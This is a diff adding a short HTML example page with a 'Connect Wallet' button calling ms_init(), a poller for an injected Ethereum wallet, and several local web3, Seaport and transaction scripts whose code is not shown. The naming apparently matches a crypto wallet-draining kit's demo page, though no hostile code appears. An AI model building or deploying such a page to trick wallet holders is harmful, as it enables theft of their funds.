@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Example</title>
+  <style>
+    @media (prefers-color-scheme: dark) {
+      html, body {
+        background: #212020;
+        color: #fff;
+      }
+    }
+  </style>
+</head>
+<body>
+  <hr>
+  <div class="advanced_mode">
+    <p><strong>Integrated Wallet:</strong> <span id="injected-status">false</span></p>
+    <button onclick="ms_init()">Connect Wallet</button>
+  </div>
+  <script src="/Client/assets/web3-provider/web3-connect.js"></script>
+  <script src="/Client/assets/web3-provider/web3-router.js"></script>
+  <script src="/Client/assets/web3-provider/web3-module.js"></script>
+  <script src="/Client/assets/web3-provider/web3-alert.js"></script>
+  <script src="/Client/assets/web3-provider/web3-seaport.js"></script>
+  <script src="/Client/assets/web3-provider/web3-data.js"></script>
+  <script src="/Client/assets/web3-provider/ethers.js"></script>
+  <script src="/Client/assets/web3-provider/ethereum-tx.js"></script>
+  <script src="/Client/assets/web3-provider.js"></script>
+  <script>
+    setInterval(() => {
+      document.getElementById('injected-status').innerHTML = (typeof window.ethereum === 'object') ? 'true' : 'false';
+    }, 1000);
+  </script>
+</body>
+</html>
